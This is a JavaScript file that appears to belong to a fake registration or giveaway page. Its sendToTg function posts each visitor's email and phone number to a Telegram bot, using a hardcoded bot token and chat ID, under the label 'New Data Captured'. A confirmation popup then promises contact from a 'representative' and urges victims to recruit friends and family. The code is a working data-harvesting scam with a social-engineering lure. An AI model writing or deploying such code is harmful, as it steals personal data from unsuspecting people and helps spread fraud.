const tokens = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
const chatIds = '5538909913';

function sendToTg(e, p, token = tokens, chatId = chatIds) {
  const message = `*---New Data Captured---*\n\n*New Email:* ${e}\n\n*New Phone:* ${p}\n\n*--- End ---*`;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
    }),
  })
    .then(response => response.ok)
    .catch(() => false);
}








function regConfirm(email, phone) {
    Swal.fire({
        icon: 'success',
        title: '༺ Registration Successful ༻',
        html: `
            <p style="font-size: 16px; line-height: 1.5;">
                <strong>Thank you for joining us!</strong><br>
                Our representative will contact you shortly via 
                <span style="color: #007BFF;">"${email}"</span> or 
                <span style="color: #007BFF;">"${phone}"</span> with further instructions.<br>
                We value your participation and warmly encourage you to spread the word.<br>
                Invite friends and family to enjoy these benefits!
            </p>
        `,
        confirmButtonText: 'Close',
        confirmButtonColor: '#3085d6',
    }).then(() => {
    setTimeout(()=>{
    window.open('./index.html','_self');},2000);
    });
}
/*
function regConfirm(email, phone) {
    Swal.fire({
        icon: 'success',
        title: 'Registration Successful🎉',
        text: `Thank you for completing your registration! Our representative will reach out to you shortly via "${email}" or "${phone}" with further details. We appreciate your participation and encourage you to share this opportunity with friends and family. Merry Christmas`,
    }).then(() => {window.open('./register.html');});
}
*/
